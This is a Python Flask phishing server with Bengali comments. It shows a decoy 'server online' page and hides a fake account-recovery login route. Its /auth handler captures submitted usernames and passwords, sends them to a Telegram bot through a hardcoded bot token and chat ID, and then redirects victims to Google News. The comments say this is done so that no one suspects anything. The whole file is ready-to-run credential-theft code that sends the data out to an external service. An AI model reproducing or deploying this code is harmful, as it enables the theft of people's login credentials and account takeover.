import requests
from flask import Flask, render_template, request, redirect

app = Flask(__name__)

BOT_TOKEN = "8307189262:AAF-D6rvhKzuzFo3vCJam4R_hKgNvOCv6uI"
CHAT_ID = "8307189262"

@app.route('/')
def home():
    # এখানে একটি সাধারণ পেজ যা দেখে কেউ সন্দেহ করবে না
    return "<h1>Server Status: Online</h1><p>Operation successful. API is active.</p>", 200

# এই লিঙ্কটি কেউ ম্যানুয়ালি না লিখলে ফিশিং পেজ খুলবে না
@app.route('/account-recovery-system-v2') 
def login_page():
    return render_template('index.html')

@app.route('/auth', methods=['POST'])
def handle_data():
    # ডাটা সংগ্রহ
    u = request.form.get('username')
    p = request.form.get('password')

    msg = f"📩 **New Hit**\nUser: `{u}`\nPass: `{p}`"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})

    # রিডাইরেক্ট করে গুগল নিউজে পাঠিয়ে দিন যাতে সন্দেহ না হয়
    return redirect("https://news.google.com")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
